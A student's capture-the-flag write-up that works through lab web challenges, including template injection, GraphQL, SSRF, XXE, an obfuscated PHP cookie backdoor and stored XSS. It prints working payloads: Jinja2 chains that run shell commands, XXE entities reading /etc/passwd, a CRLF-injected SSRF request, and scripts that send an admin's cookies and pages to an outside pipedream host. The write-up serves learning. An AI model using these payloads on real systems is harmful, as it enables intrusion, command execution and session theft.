# Web Security writeup
by Ka Po Chau

# ssti
By following [this guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), I was able to check the ssti injection and confirmed that it is python jinja2.
> {{7*'7'}} = 7777777
> 
> {{foobar}} = Nothing

## ssti1
just using `{{config}}` I was able to find the flag inside it.

## ssti2
[Detailed steps](https://secure-cookie.io/attacks/ssti/) to the ssti attack. I had to first find the number of `warnings.catch_warnings` with 
```
{{ "foo".__class__.__base__.__subclasses__() }}
```
It is 305th line, which means I can then do:
```
{{ "foo".__class__.__base__.__subclasses__()[305].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
{{ "foo".__class__.__base__.__subclasses__()[305].__init__.__globals__['sys'].modules['os'].popen("cat flag.txt").read() }}
```
and got the flag from `flag.txt`.

## ssti3
Same as ssti2 except `warnings.catch_warnings` is at 299.

```
{{ "foo".__class__.__base__.__subclasses__()[299].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
{{ "foo".__class__.__base__.__subclasses__()[299].__init__.__globals__['sys'].modules['os'].popen("./getFlag").read() }}
```

## ssti 4
I was unable to solve this challenge, tried to do an ls that showed:
```
app.py
config.py
docker-compose.yml
index.html
```
and read the docker-compose.yml, but could not get the port of the old docker container. nmap scan showed 1 ssh port and 2 html ports, but could not figure out a way to attack. Also tried to reverse shell with ncat but was not working.


# graphql Confessions
Following [this guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql) I was able to query the graphql database. This was my steps:
```
https://confessions.secu-web.blackfoot.dev/graphql?query={__schema{types{name,fields{name}}}}
```
got the database schema, letting me know how to request confession logs:
```
https://confessions.secu-web.blackfoot.dev/graphql?query={requestsLog{%20name,%20args}}
```
after realizing that graphql makes a separate confession log for EACH character entered, I was able to bruteforce the full flag starting from log #0 with [sha256 hash generator](https://www.miraclesalad.com/webtools/sha256.php) and checking the result of each character.


# ssrf
Detailed steps [here](http://voisin.iiens.net/FIC.html) I first tried many different combinations like `127.0.0.1` and `127.0.00.1/secret` but they did not work.
I realize it is because the server automatically added `http://` to the beginning and port `:80` to the end of my input.
I then used `127.0.00.1/secret?` with the `?` to escape the `:80`.
This worked but then gave me another error:
```
{"ok":false,"message":"Missing GOSESSION ... You are not connected... get away !","flag":""}
```
I then query the `/host` instead and gave it the parameter to query `/secret`. With 2 redirections I was able to get the flag.

What I used in the end:
```
127.00.0.1/host?host=127.0.00.1/secret?%20HTTP/1.1%0D%0ACookie:%20GOSESSION=guest-go1.11.5
```
Which is then [decoded](https://www.base64decode.org/) for the flag.

# xxe
## xxe1
Just by inspecting `main.js` and directly editing it on chrome, I was able to get the flag with xxe injection.
In the html file was already a hidden clue `<!-- // include_once('flag.php'); -->` We know there is a `flag.php`.
What I added to `main.js` below `<?xml version="1.0"?>`:
```
      <!DOCTYPE foo [ 
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
      <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
      ]>
```
Then I entered `&ac;` as message.

## xxe2
Same except this time the result is not displayed so it is a blind xxe. But by checking `index.php`, we know that error is still displayed!
```
        $message = "Thanks for your message: '$msg'";
    } catch (Exception $e) {
        $message = "Issue with the message: $e";
    }
```
^ This is how xxe1 looks like
```
        $message = "Thanks for your message :)";
    } catch (Exception $e) {
        $message = "Issue with the message: $e";
    }
```
^ This is how xxe2 looks like.

So then I just used error display instead to get the result of `flag.php`.
This is what I entered:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php"> %xxe; ]>
```
Got flag from error message.

# obfuscation
## OBF100
Very easy. Just by reading the javascript I was able to [decode the password](https://deobfuscate.io/).
```
var _0xf7f7=["\x67\x67\x65\x7A","\x45\x6E\x74\x65\x72\x20\x74\x68\x65\x20\x66\x6C\x61\x67\x20\x3A\x20","\x70\x72\x6F\x6D\x70\x74","\x43\x6F\x6E\x67\x72\x61\x74\x73\x20\x21\x20\x59\x6F\x75\x20\x63\x61\x6E\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x20\x74\x68\x69\x73\x20\x63\x68\x61\x6C\x6C\x65\x6E\x67\x65\x20\x77\x69\x74\x68\x20\x74\x68\x65\x20\x66\x6C\x61\x67\x20\x42\x43\x53\x7B","\x7D","\x57\x68\x61\x74\x20\x69\x73\x20\x74\x68\x69\x73\x20\x6D\x61\x6E\x20\x3F\x20\x47\x65\x74\x20\x79\x6F\x75\x72\x20\x73\x68\x69\x74\x20\x74\x6F\x67\x65\x74\x68\x65\x72\x2E\x20\x51\x75\x69\x63\x6B\x6C\x79\x2E"];var password=_0xf7f7[0];var input=window[_0xf7f7[2]](_0xf7f7[1]);if(password=== input){alert(_0xf7f7[3]+ input+ _0xf7f7[4]);}else {alert(_0xf7f7[5]);}
```
decodes into:
```
var password = "ggez";
```
## script_kidding
Very difficult, mostly due to lack of information on the internet apart from 1 stackoverflow [thread](https://wordpress.stackexchange.com/questions/362935/is-this-code-malidcous).

It is a cookie hack backdoor. By reading the decoded php and reversing the required input, I was able to use an accepted cookie to crack it.

```
a:2:{s:2:"ak";s:2:"hi";s:1:"a";s:1:"i";}
```
This is the first cookie I needed to use to confirm it works. This is a seriallized array that the backdoor needs, according to the php it needs array with input['ak'] exists and input['a']='i'.

I was able to encode it by reversing the backdoor's own decoding system! Took a full day but great success.

The backdoor's salt: `4ef63abe-1abd-45a6-913d-6fb99657e24b`

I had to reverse the decode function to figure out how to encode my cookie.

This is the full dictionary I got, from trial and error everything:
```
" = Iq..
' = J2..
( = KA..
) = Ka..
. = Lq..
/ = L2..
: = Oq..
; = O2..
_ = X2..
{ = e2..
} = fa..
a = Ya..
b = Yq..
c = Y2..
d = ZA..
e = Za..
f = Zq..
g = Z2..
h = aA..
i = aa..
j = aq..
k = a2..
l = bA..
m = ba..
n = bq..
o = b2..
p = cA..
q = ca..
r = cq..
s = c2..
t = dA..
u = da..
v = dq..
w = d2..
x = eA..
y = ea..
z = eq..
0 = MA..
1 = Ma..
2 = Mq..
3 = M2..
4 = NA..
5 = Na..
6 = Nq..
7 = N2..
8 = OA..
9 = Oa..
```

After that I was able to write a working cookie.

Confirming that it works, I then wrote a cookie to scan directory:
```
a:3:{s:2:"ak";s:2:"hi";s:1:"a";s:1:"e";s:1:"d";s:23:"print_r(scandir('./'));";}
```
which gave me the directory listing and I was able to find the hidden file.

# xxs

## whatsup
After reading a lot of [guides](https://ironhackers.es/tutoriales/csrf-xss-filter-bypass/) I first tried simple injection:
```
<SCrIpT>alert(1)</SCrIpT>
```
it worked!
We know the admin is checking messages every minute. So admin will run whatever code I injected as well.
So then I tried another injection, with [pipedream](https://pipedream.com/) I opened a new pipe to check any incoming requests.
```
<SCrIpT>var x1=new XMLHttpRequest(); x1.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=test", false); x1.send()</SCrIpT>
```
it also worked! my pipdream line got 2 requests from myself and the admin `client ip: 35.242.202.31`.
```
<SCRIPT>var x1=new XMLHttpRequest(); x1.open("GET", "/messages", false); x1.send();var x2=new XMLHttpRequest(); x2.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=" + btoa(unescape(x1.responseText)), false); x2.send();</SCrIpT>
```
With using this I was able to spy on admin's messages page and see their messages. But it was useless, flag was not there.
I was very very confused. I was sure the flag is somewhere in the admin's messages.
I thought no way it is admin's cookie, because my own cookies from this website is `HttpOnly`. It is uncrackable. So I thought admin's cookie would be the same and that cookies is not the way to go. `document.cookie` on myself is empty.
But I decided to try anyway after a while.
```
<SCRIPT>var x2=new XMLHttpRequest(); x2.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=f_" + document.cookie, false);  x2.send();</SCrIpT>
answer: https://eo2awd21wqscuhf.m.pipedream.net/?1=f_flag=BFS{XSS_M0R3_L!K3_FR33_C00K!35}
```
Somehow the admin's cookie is NOT `HttpOnly` and it is the flag. Shrug

## whatsup2
Very easy after whatsup1. Same thing except messages are sanitized so cannot be injected. But the image link is not, so we can inject there still.
What I entered for the image:
```
1" onerror="var x2=new XMLHttpRequest(); x2.open('GET', 'https://eo2awd21wqscuhf.m.pipedream.net/?1=f_' + document.cookie, false);  x2.send();
https://eo2awd21wqscuhf.m.pipedream.net/?1=f_flag=BFS{4n_1m4g3_79_w0r7h_a_7h0u54nd_w0rd5}
```

# jwt
